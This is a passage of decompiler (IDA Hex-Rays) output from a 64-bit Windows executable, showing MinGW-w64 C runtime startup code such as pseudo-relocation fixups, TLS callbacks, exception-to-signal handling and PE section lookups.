        "  VirtualQuery failed for %d bytes at address %p",
        *(unsigned int *)(v9 + 8),
        *(const void **)(qword_13F929628 + v10 + 24));
    LODWORD(v8) = Buffer.Protect;
    if ( ((Buffer.Protect - 4) & 0xFFFFFFFB) != 0 )
    {
      LODWORD(v8) = (Buffer.Protect - 64) & 0xFFFFFFBF;
      if ( (_DWORD)v8 )
      {
        v16 = qword_13F929628 + v10;
        BaseAddress = Buffer.BaseAddress;
        RegionSize = Buffer.RegionSize;
        *(_QWORD *)(v16 + 8) = Buffer.BaseAddress;
        *(_QWORD *)(v16 + 16) = RegionSize;
        LODWORD(v8) = VirtualProtect(BaseAddress, RegionSize, 0x40u, (PDWORD)v16);
        if ( !(_DWORD)v8 )
        {
          LastError = GetLastError();
          sub_13F9248B0("  VirtualProtect failed with code 0x%x", LastError);
        }
      }
    }
    ++dword_13F929624;
  }
  else
  {
    v7 = 0;
    v8 = qword_13F929628 + 24;
    while ( (unsigned __int64)a1 < *(_QWORD *)v8
         || (unsigned __int64)a1 >= (unsigned __int64)*(unsigned int *)(*(_QWORD *)(v8 + 8) + 8i64) + *(_QWORD *)v8 )
    {
      ++v7;
      v8 += 40i64;
      if ( v7 == dword_13F929624 )
        goto LABEL_6;
    }
  }
  if ( a3 >= 8 )
  {
    v8 = a3;
    v13 = a3 - 1;
    *(_QWORD *)((char *)a1 + v8 - 8) = *(_QWORD *)((char *)a2 + v8 - 8);
    if ( v13 >= 8 )
    {
      v14 = v13 & 0xFFFFFFF8;
      LODWORD(v8) = 0;
      do
      {
        v15 = (unsigned int)v8;
        LODWORD(v8) = v8 + 8;
        *(_QWORD *)((char *)a1 + v15) = *(_QWORD *)((char *)a2 + v15);
      }
      while ( (unsigned int)v8 < v14 );
    }
  }
  else if ( (a3 & 4) != 0 )
  {
    *a1 = *a2;
    LODWORD(v8) = *(_DWORD *)((char *)a2 + a3 - 4);
    *(_DWORD *)((char *)a1 + a3 - 4) = v8;
  }
  else if ( a3 )
  {
    LODWORD(v8) = *(unsigned __int8 *)a2;
    *(_BYTE *)a1 = v8;
    if ( (a3 & 2) != 0 )
    {
      LODWORD(v8) = *(unsigned __int16 *)((char *)a2 + a3 - 2);
      *(_WORD *)((char *)a1 + a3 - 2) = v8;
    }
  }
  return v8;
}
// 13F9244C0: using guessed type __int64 sub_13F9244C0(void);
// 13F929624: using guessed type int dword_13F929624;
// 13F929628: using guessed type __int64 qword_13F929628;

//----- (000000013F9238C0) ----------------------------------------------------
void sub_13F9238C0()
{
  int v0; // ebx
  signed __int64 v1; // rax
  _DWORD *v2; // rsi
  void *v3; // rsp
  int v4; // edx
  _DWORD *v5; // r14
  unsigned __int64 v6; // r12
  unsigned __int64 v7; // rcx
  int v8; // eax
  __int64 v9; // rsi
  DWORD v10; // r8d
  __int64 v11; // rdx
  unsigned int *v12; // rsi
  __int64 v13; // rdx
  _DWORD *v14; // rcx
  __int64 v15; // rax
  __int64 v16; // r9
  unsigned __int64 v17; // r8
  unsigned __int64 v18; // rdx
  unsigned __int64 v19; // r8
  char v20; // [rsp+20h] [rbp-60h] BYREF
  DWORD flOldProtect[2]; // [rsp+28h] [rbp-58h] BYREF

  v0 = dword_13F929620;
  if ( dword_13F929620 )
    return;
  dword_13F929620 = 1;
  sub_13F924410();
  v1 = sub_13F924650();
  dword_13F929624 = 0;
  v2 = off_13F926940;
  v3 = alloca(v1);
  qword_13F929628 = (__int64)&v20;
  if ( (_BYTE *)off_13F926930 - (_BYTE *)off_13F926940 <= 7 )
    return;
  v4 = *(_DWORD *)off_13F926940;
  if ( (_BYTE *)off_13F926930 - (_BYTE *)off_13F926940 > 11 )
  {
    if ( v4 || *((_DWORD *)off_13F926940 + 1) )
      goto LABEL_6;
    if ( *((_DWORD *)off_13F926940 + 2) )
      goto LABEL_20;
    v4 = *((_DWORD *)off_13F926940 + 3);
    v2 = (char *)off_13F926940 + 12;
  }
  if ( v4 || v2[1] )
  {
LABEL_6:
    if ( v2 >= off_13F926930 )
      return;
    v5 = v2 + 2;
    v6 = (unsigned __int64)&v2[2 * ((unsigned __int64)((_BYTE *)off_13F926930 + 7 - (_BYTE *)(v2 + 2)) >> 3) + 2];
    while ( 1 )
    {
      v7 = (unsigned int)v2[1];
      v8 = *v2;
      v2 = v5;
      v7 += 0x400000i64;
      flOldProtect[0] = *(_DWORD *)v7 + v8;
      sub_13F9236F0((_DWORD *)v7, flOldProtect, 4u);
      if ( v5 == (_DWORD *)v6 )
        break;
      v5 += 2;
    }
    goto LABEL_10;
  }
LABEL_20:
  v11 = (unsigned int)v2[2];
  if ( (_DWORD)v11 != 1 )
    sub_13F9248B0("  Unknown pseudo relocation protocol version %d.\n", v11);
  v12 = v2 + 3;
  if ( v12 < off_13F926930 )
  {
    do
    {
      v13 = *((unsigned __int8 *)v12 + 8);
      v14 = (_DWORD *)(v12[1] + 0x400000i64);
      v15 = *v12 + 0x400000i64;
      v16 = *(_QWORD *)(*v12 + 0x400000i64);
      if ( (_DWORD)v13 == 16 )
      {
        v17 = *(unsigned __int16 *)(v12[1] + 0x400000i64);
        if ( (v17 & 0x8000u) != 0i64 )
          v17 = *(unsigned __int16 *)(v12[1] + 0x400000i64) | 0xFFFFFFFFFFFF0000ui64;
        *(_QWORD *)flOldProtect = v16 + v17 - v15;
        sub_13F9236F0(v14, flOldProtect, 2u);
      }
      else if ( (unsigned int)v13 <= 0x10 )
      {
        if ( (_DWORD)v13 != 8 )
        {
LABEL_39:
          *(_QWORD *)flOldProtect = 0i64;
          sub_13F9248B0("  Unknown pseudo relocation bit size %d.\n", v13);
        }
        v19 = *(unsigned __int8 *)(v12[1] + 0x400000i64);
        if ( (v19 & 0x80u) != 0i64 )
          v19 = *(unsigned __int8 *)(v12[1] + 0x400000i64) | 0xFFFFFFFFFFFFFF00ui64;
        *(_QWORD *)flOldProtect = v16 + v19 - v15;
        sub_13F9236F0(v14, flOldProtect, 1u);
      }
      else if ( (_DWORD)v13 == 32 )
      {
        v18 = *(unsigned int *)(v12[1] + 0x400000i64) | 0xFFFFFFFF00000000ui64;
        if ( *(int *)(v12[1] + 0x400000i64) >= 0 )
          v18 = *(unsigned int *)(v12[1] + 0x400000i64);
        *(_QWORD *)flOldProtect = v16 + v18 - v15;
        sub_13F9236F0(v14, flOldProtect, 4u);
      }
      else
      {
        if ( (_DWORD)v13 != 64 )
          goto LABEL_39;
        *(_QWORD *)flOldProtect = v16 + *(_QWORD *)(v12[1] + 0x400000i64) - v15;
        sub_13F9236F0(v14, flOldProtect, 8u);
      }
      v12 += 3;
    }
    while ( v12 < off_13F926930 );
LABEL_10:
    v9 = 0i64;
    if ( dword_13F929624 > 0 )
    {
      do
      {
        v10 = *(_DWORD *)(v9 + qword_13F929628);
        if ( v10 )
          VirtualProtect(
            *(LPVOID *)(v9 + qword_13F929628 + 8),
            *(_QWORD *)(v9 + qword_13F929628 + 16),
            v10,
            flOldProtect);
        ++v0;
        v9 += 40i64;
      }
      while ( v0 < dword_13F929624 );
    }
  }
}
// 13F926930: using guessed type void *off_13F926930;
// 13F926940: using guessed type void *off_13F926940;
// 13F929620: using guessed type int dword_13F929620;
// 13F929624: using guessed type int dword_13F929624;
// 13F929628: using guessed type __int64 qword_13F929628;

//----- (000000013F923B80) ----------------------------------------------------
__int64 __fastcall sub_13F923B80(unsigned int *a1)
{
  unsigned int v1; // eax
  _crt_signal_t v2; // rax
  _crt_signal_t v4; // rax
  _crt_signal_t v5; // rax

  v1 = *a1;
  if ( *a1 > 0xC0000091 )
  {
    if ( v1 == -1073741676 )
    {
      v4 = signal(8, 0i64);
      if ( v4 == (_crt_signal_t)1 )
      {
        signal(8, (_crt_signal_t)1);
        return 0i64;
      }
      goto LABEL_15;
    }
    if ( v1 > 0xC0000094 )
    {
      if ( v1 == -1073741675 )
        return 0i64;
      if ( v1 != -1073741674 )
        return 1i64;
      goto LABEL_19;
    }
    if ( v1 == -1073741678 )
      return 0i64;
    if ( v1 != -1073741677 )
      return 1i64;
LABEL_14:
    v4 = signal(8, 0i64);
    if ( v4 == (_crt_signal_t)1 )
    {
      signal(8, (_crt_signal_t)1);
      sub_13F9236C0();
      return 0i64;
    }
LABEL_15:
    if ( v4 )
    {
      ((void (__fastcall *)(__int64))v4)(8i64);
      return 0i64;
    }
    return 1i64;
  }
  if ( v1 >= 0xC000008D )
    goto LABEL_14;
  if ( v1 == -1073741816 )
    return 0i64;
  if ( v1 > 0xC0000008 )
  {
    if ( v1 != -1073741795 )
      return v1 != -1073741684;
LABEL_19:
    v5 = signal(4, 0i64);
    if ( v5 == (_crt_signal_t)1 )
    {
      signal(4, (_crt_signal_t)1);
      return 0i64;
    }
    if ( v5 )
    {
      ((void (__fastcall *)(__int64))v5)(4i64);
      return 0i64;
    }
    return 4i64;
  }
  if ( v1 == -2147483646 )
    return 0i64;
  if ( v1 != -1073741819 )
    return 1i64;
  v2 = signal(11, 0i64);
  if ( v2 == (_crt_signal_t)1 )
  {
    signal(11, (_crt_signal_t)1);
    return 0i64;
  }
  if ( v2 )
  {
    ((void (__fastcall *)(__int64))v2)(11i64);
    return 0i64;
  }
  return 4i64;
}

//----- (000000013F923D20) ----------------------------------------------------
__int64 sub_13F923D20()
{
  ULONG64 v0; // rbp
  __int64 result; // rax
  struct _IMAGE_RUNTIME_FUNCTION_ENTRY *v2; // rbx
  __int64 v3; // rsi
  _DWORD *v4; // rdi
  DWORD v5; // ecx
  DWORD v6; // ecx
  int v7; // eax
  __int64 v8; // rax
  ULONG v9; // edx

  v0 = sub_13F9244C0();
  result = (unsigned int)dword_13F929648;
  if ( !dword_13F929648 && v0 )
  {
    dword_13F929648 = 1;
    if ( !sub_13F924300(".pdata") )
    {
      v2 = &FunctionTable;
      v3 = 0i64;
      memset(&FunctionTable, 0, 0x180ui64);
      memset(&unk_13F929660, 0, 0x100ui64);
      v4 = &unk_13F929660;
      while ( 1 )
      {
        v8 = sub_13F924450();
        if ( !v8 )
          break;
        *(_BYTE *)v4 = 9;
        ++v3;
        ++v2;
        v4[1] = (unsigned int)sub_13F923B80 - v0;
        v5 = *(_DWORD *)(v8 + 12);
        v2[-1].BeginAddress = v5;
        v6 = *(_DWORD *)(v8 + 8) + v5;
        v7 = (int)v4;
        v4 += 2;
        v2[-1].UnwindInfoAddress = v7 - v0;
        v2[-1].EndAddress = v6;
        if ( v3 == 32 )
        {
          v9 = 32;
          goto LABEL_10;
        }
      }
      v9 = v3;
      if ( !v3 )
        return 1i64;
LABEL_10:
      RtlAddFunctionTable(&FunctionTable, v9, v0);
    }
    return 1i64;
  }
  return result;
}
// 13F923D20: using guessed type __int64 __fastcall sub_13F923D20();
// 13F9244C0: using guessed type __int64 sub_13F9244C0(void);
// 13F929648: using guessed type int dword_13F929648;

//----- (000000013F924000) ----------------------------------------------------
void sub_13F924000()
{
  _QWORD *v0; // rbx
  LPVOID Value; // rsi

  EnterCriticalSection(&CriticalSection);
  v0 = Block;
  if ( Block )
  {
    do
    {
      Value = TlsGetValue(*(_DWORD *)v0);
      if ( !GetLastError() && Value )
        ((void (__fastcall *)(LPVOID))v0[1])(Value);
      v0 = (_QWORD *)v0[2];
    }
    while ( v0 );
  }
  LeaveCriticalSection(&CriticalSection);
}

//----- (000000013F924070) ----------------------------------------------------
__int64 __fastcall sub_13F924070(int a1, __int64 a2)
{
  unsigned int v2; // esi
  _QWORD *v6; // rax
  _QWORD *v7; // rbx
  void *v8; // rax

  v2 = 0;
  if ( !dword_13F9298E8 )
    return v2;
  v6 = calloc(1ui64, 0x18ui64);
  v7 = v6;
  if ( !v6 )
    return (unsigned int)-1;
  *(_DWORD *)v6 = a1;
  v6[1] = a2;
  EnterCriticalSection(&CriticalSection);
  v8 = Block;
  Block = v7;
  v7[2] = v8;
  LeaveCriticalSection(&CriticalSection);
  return 0i64;
}
// 13F9298E8: using guessed type int dword_13F9298E8;

//----- (000000013F9240F0) ----------------------------------------------------
__int64 __fastcall sub_13F9240F0(int a1)
{
  _QWORD *v3; // rax
  _QWORD *v4; // rcx

  if ( !dword_13F9298E8 )
    return 0i64;
  EnterCriticalSection(&CriticalSection);
  v3 = Block;
  if ( Block )
  {
    if ( a1 == *(_DWORD *)Block )
    {
      v4 = Block;
      Block = (void *)*((_QWORD *)Block + 2);
LABEL_12:
      free(v4);
      LeaveCriticalSection(&CriticalSection);
      return 0i64;
    }
    while ( 1 )
    {
      v4 = (_QWORD *)v3[2];
      if ( !v4 )
        break;
      if ( *(_DWORD *)v4 == a1 )
      {
        v3[2] = v4[2];
        goto LABEL_12;
      }
      v3 = (_QWORD *)v3[2];
    }
  }
  LeaveCriticalSection(&CriticalSection);
  return 0i64;
}
// 13F9298E8: using guessed type int dword_13F9298E8;

//----- (000000013F924190) ----------------------------------------------------
__int64 __fastcall sub_13F924190(__int64 a1, int a2)
{
  _QWORD *v3; // rcx
  _QWORD *v4; // rbx

  if ( a2 == 1 )
  {
    if ( !dword_13F9298E8 )
      InitializeCriticalSection(&CriticalSection);
    dword_13F9298E8 = 1;
    return 1i64;
  }
  else
  {
    if ( a2 )
    {
      if ( a2 == 2 )
      {
        sub_13F9236C0();
      }
      else if ( a2 == 3 )
      {
        if ( dword_13F9298E8 )
          sub_13F924000();
      }
    }
    else
    {
      if ( dword_13F9298E8 )
        sub_13F924000();
      if ( dword_13F9298E8 == 1 )
      {
        v3 = Block;
        if ( Block )
        {
          do
          {
            v4 = (_QWORD *)v3[2];
            free(v3);
            v3 = v4;
          }
          while ( v4 );
        }
        Block = 0i64;
        dword_13F9298E8 = 0;
        DeleteCriticalSection(&CriticalSection);
      }
    }
    return 1i64;
  }
}
// 13F9298E8: using guessed type int dword_13F9298E8;

//----- (000000013F924270) ----------------------------------------------------
_BOOL8 __fastcall sub_13F924270(__int64 a1)
{
  __int64 v1; // rcx
  _BOOL8 result; // rax

  v1 = *(int *)(a1 + 60) + a1;
  result = 0i64;
  if ( *(_DWORD *)v1 == 17744 )
    return *(_WORD *)(v1 + 24) == 523;
  return result;
}

//----- (000000013F924290) ----------------------------------------------------
_BOOL8 __fastcall sub_13F924290(__int64 a1)
{
  return *(_WORD *)a1 == 23117 && sub_13F924270(a1);
}

//----- (000000013F9242B0) ----------------------------------------------------
__int64 __fastcall sub_13F9242B0(__int64 a1, unsigned __int64 a2)
{
  __int64 v2; // rcx
  __int64 result; // rax
  int v4; // ecx
  __int64 v5; // r9

  v2 = *(int *)(a1 + 60) + a1;
  result = v2 + *(unsigned __int16 *)(v2 + 20) + 24;
  v4 = *(unsigned __int16 *)(v2 + 6);
  if ( !v4 )
    return 0i64;
  v5 = result + 40i64 * (unsigned int)(v4 - 1) + 40;
  while ( *(unsigned int *)(result + 12) > a2
       || (unsigned int)(*(_DWORD *)(result + 8) + *(_DWORD *)(result + 12)) <= a2 )
  {
    result += 40i64;
    if ( result == v5 )
      return 0i64;
  }
  return result;
}

//----- (000000013F924300) ----------------------------------------------------
const char *__fastcall sub_13F924300(char *Str2)
{
  __int64 v2; // rdx
  __int64 v3; // rcx
  const char *v4; // rbx
  __int64 v5; // rdi

  if ( strlen(Str2) > 8 )
    return 0i64;
  if ( MEMORY[0x400000] != 23117 )
    return 0i64;
  if ( !sub_13F924270(0x400000i64) )
    return 0i64;
  v3 = v2 + *(int *)(v2 + 60);
  v4 = (const char *)(v3 + *(unsigned __int16 *)(v3 + 20) + 24);
  if ( !*(_WORD *)(v3 + 6) )
    return 0i64;
  v5 = (__int64)&v4[40 * *(unsigned __int16 *)(v3 + 6)];
  while ( strncmp(v4, Str2, 8ui64) )
  {
    v4 += 40;
    if ( v4 == (const char *)v5 )
      return 0i64;
  }
  return v4;
}
// 13F924333: variable 'v2' is possibly undefined

//----- (000000013F924390) ----------------------------------------------------
__int64 __fastcall sub_13F924390()
{
  __int64 v0; // rdx
  __int64 v1; // r8
  unsigned __int64 v2; // rcx
  __int64 v3; // r8
  __int64 result; // rax
  __int64 v5; // r9

  if ( MEMORY[0x400000] != 23117 )
    return 0i64;
  if ( !sub_13F924270(0x400000i64) )
    return 0i64;
  v2 = v0 - v1;
  v3 = *(int *)(v1 + 60) + v1;
  result = v3 + *(unsigned __int16 *)(v3 + 20) + 24;
  if ( !*(_WORD *)(v3 + 6) )
    return 0i64;
  v5 = result + 40i64 * ((unsigned int)*(unsigned __int16 *)(v3 + 6) - 1) + 40;
  while ( v2 < *(unsigned int *)(result + 12)
       || v2 >= (unsigned int)(*(_DWORD *)(result + 8) + *(_DWORD *)(result + 12)) )
  {
    result += 40i64;
    if ( result == v5 )
      return 0i64;
  }
  return result;
}
// 13F9243B9: variable 'v0' is possibly undefined
// 13F9243B9: variable 'v1' is possibly undefined

//----- (000000013F924410) ----------------------------------------------------
__int64 __fastcall sub_13F924410()
{
  unsigned int v0; // r8d
  __int64 v2; // rdx

  v0 = 0;
  if ( MEMORY[0x400000] == 23117 && sub_13F924270(0x400000i64) )
    return *(unsigned __int16 *)(*(int *)(v2 + 60) + v2 + 6);
  else
    return v0;
}
// 13F924425: variable 'v0' is possibly undefined
// 13F92443C: variable 'v2' is possibly undefined

//----- (000000013F924450) ----------------------------------------------------
__int64 __fastcall sub_13F924450()
{
  __int64 v0; // rdx
  __int64 v1; // r8
  __int64 v2; // rcx
  __int64 result; // rax
  int v4; // ecx
  __int64 v5; // rcx

  if ( MEMORY[0x400000] == 23117 && sub_13F924270(0x400000i64) )
  {
    v2 = v1 + *(int *)(v1 + 60);
    result = v2 + *(unsigned __int16 *)(v2 + 20) + 24;
    v4 = *(unsigned __int16 *)(v2 + 6);
    if ( v4 )
    {
      v5 = result + 40i64 * (unsigned int)(v4 - 1) + 40;
      do
      {
        if ( (*(_BYTE *)(result + 39) & 0x20) != 0 )
        {
          if ( !v0 )
            return result;
          --v0;
        }
        result += 40i64;
      }
      while ( result != v5 );
    }
  }
  return 0i64;
}
// 13F924476: variable 'v1' is possibly undefined
// 13F9244A9: variable 'v0' is possibly undefined

//----- (000000013F9244C0) ----------------------------------------------------
__int64 sub_13F9244C0()
{
  bool v0; // zf
  __int64 v1; // rdx
  __int64 result; // rax

  if ( MEMORY[0x400000] != 23117 )
    return 0i64;
  v0 = !sub_13F924270(0x400000i64);
  result = 0i64;
  if ( !v0 )
    return v1;
  return result;
}
// 13F9244E1: variable 'v1' is possibly undefined
// 13F9244C0: using guessed type __int64 __fastcall sub_13F9244C0();

//----- (000000013F924500) ----------------------------------------------------
_BOOL8 __fastcall sub_13F924500()
{
  _BOOL8 result; // rax
  __int64 v1; // rdx
  __int64 v2; // r8
  unsigned __int64 v3; // rcx
  __int64 v4; // r8
  _DWORD *v5; // rax
  __int64 v6; // r9

  result = 0i64;
  if ( MEMORY[0x400000] == 23117 )
  {
    result = sub_13F924270(0x400000i64);
    if ( result )
    {
      v3 = v1 - v2;
      v4 = *(int *)(v2 + 60) + v2;
      v5 = (_DWORD *)(v4 + *(unsigned __int16 *)(v4 + 20) + 24);
      if ( *(_WORD *)(v4 + 6) )
      {
        v6 = (__int64)&v5[10 * *(unsigned __int16 *)(v4 + 6)];
        while ( v3 < (unsigned int)v5[3] || v3 >= (unsigned int)(v5[2] + v5[3]) )
        {
          v5 += 10;
          if ( v5 == (_DWORD *)v6 )
            return 0i64;
        }
        return v5[9] >= 0;
      }
      else
      {
        return 0i64;
      }
    }
  }
  return result;
}
// 13F924533: variable 'v1' is possibly undefined
// 13F924533: variable 'v2' is possibly undefined

//----- (000000013F9245A0) ----------------------------------------------------
__int64 __fastcall sub_13F9245A0()
{
  int v0; // r9d
  __int64 v1; // r11
  __int64 v2; // rax
  unsigned __int64 v3; // rdx
  __int64 v4; // rcx
  int v5; // eax
  __int64 v6; // rax
  __int64 v8; // rdx

  if ( MEMORY[0x400000] == 23117 && sub_13F924270(0x400000i64) )
  {
    v2 = v1 + *(int *)(v1 + 60);
    v3 = *(unsigned int *)(v2 + 144);
    if ( (_DWORD)v3 )
    {
      v4 = v2 + *(unsigned __int16 *)(v2 + 20) + 24;
      v5 = *(unsigned __int16 *)(v2 + 6);
      if ( v5 )
      {
        v6 = v4 + 40i64 * (unsigned int)(v5 - 1) + 40;
        while ( v3 < *(unsigned int *)(v4 + 12) || v3 >= (unsigned int)(*(_DWORD *)(v4 + 8) + *(_DWORD *)(v4 + 12)) )
        {
          v4 += 40i64;
          if ( v4 == v6 )
            return 0i64;
        }
        v8 = v1 + v3;
        if ( v8 )
        {
          while ( *(_DWORD *)(v8 + 4) || *(_DWORD *)(v8 + 12) )
          {
            if ( v0 <= 0 )
              return v1 + *(unsigned int *)(v8 + 12);
            --v0;
            v8 += 20i64;
          }
        }
      }
    }
  }
  return 0i64;
}
// 13F9245C6: variable 'v1' is possibly undefined
// 13F924620: variable 'v0' is possibly undefined

//----- (000000013F924650) ----------------------------------------------------
unsigned __int64 __fastcall sub_404650()
{
  unsigned __int64 v0; // rax
  char *v1; // rcx
  unsigned __int64 v3; // [rsp-8h] [rbp-10h]
  char v4; // [rsp+10h] [rbp+8h] BYREF

  v3 = v0;
  v1 = &v4;
  if ( v0 >= 0x1000 )
  {
    do
    {
      v1 -= 4096;
      *(_QWORD *)v1 = *(_QWORD *)v1;
      v0 -= 4096i64;
    }
    while ( v0 > 0x1000 );
  }
  *(_QWORD *)&v1[-v0] = *(_QWORD *)&v1[-v0];
  return v3;
}
// 13F924651: variable 'v0' is possibly undefined

//----- (000000013F924750) ----------------------------------------------------
FILE *__fastcall sub_13F924750(int a1)
{
  return &_iob_func()[a1];
}

//----- (000000013F924770) ----------------------------------------------------
__int64 sub_13F924770()
{
  return qword_13F929950;
}
// 13F924770: using guessed type __int64 __fastcall sub_13F924770();
// 13F929950: using guessed type __int64 qword_13F929950;

//----- (000000013F924780) ----------------------------------------------------
__int64 __fastcall sub_13F924780(__int64 a1)
{
  return _InterlockedExchange64(&qword_13F929950, a1);
}
// 13F929950: using guessed type __int64 qword_13F929950;

//----- (000000013F924790) ----------------------------------------------------
__int64 sub_13F924790()
{
  return *(_QWORD *)off_13F926980;
}
// 13F924790: using guessed type __int64 __fastcall sub_13F924790();
// 13F926980: using guessed type void *off_13F926980;

//----- (000000013F9247A0) ----------------------------------------------------
__int64 sub_13F9247A0()
{
  return *(_QWORD *)off_13F926990;
}
// 13F9247A0: using guessed type __int64 __fastcall sub_13F9247A0();
// 13F926990: using guessed type void *off_13F926990;

//----- (000000013F9248B0) ----------------------------------------------------
void __noreturn sub_13F9248B0(char *Format, ...)
{
  FILE *v2; // rax
  FILE *v3; // rax
  va_list va; // [rsp+58h] [rbp+10h] BYREF

  va_start(va, Format);
  v2 = sub_13F924750(2);
  fwrite("Mingw-w64 runtime failure:\n", 1ui64, 0x1Bui64, v2);
  v3 = sub_13F924750(2);
  vfprintf(v3, Format, va);
  abort();
}

// nfuncs=100 queued=68 decompiled=68 lumina nreq=0 worse=0 better=0
// ALL OK, 68 function(s) have been successfully decompiled
